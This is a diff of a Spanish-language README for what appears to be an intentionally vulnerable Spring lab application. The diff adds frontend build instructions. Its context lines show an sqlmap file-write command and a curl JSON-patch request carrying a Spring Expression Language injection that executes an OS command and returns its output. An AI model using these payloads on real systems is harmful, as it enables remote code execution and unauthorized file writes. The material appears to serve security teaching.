@@ -29,3 +29,18 @@ sqlmap.py -u http://hostname:8080/users/123?id=1 --file-write=C:/tp-seguridad/do
 
 - curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" : "replace", "path" : "T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"ipconfig\").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x", "value" : "pwned" }]' "http://hostname:port/entity/1/"
 	- Permite ver el output de la ejecucion del comando
+
+
+## Frontend
+
+Actualmente se levanta lo que este en /src/main/resources/*
+Ir al directorio donde esta la aplicacion y correr
+
+- mvn clean install
+    - Agrega las dependencias para la carga de template thymeleaf y dependencias para el frontend, tambien crea el directorio
+    /src/front/dist y copia los archivos generados a /src/main/resources/static
+
+- mvn spring-boot:run
+    - Levanta la aplicacion en el puerto 8080
+
+
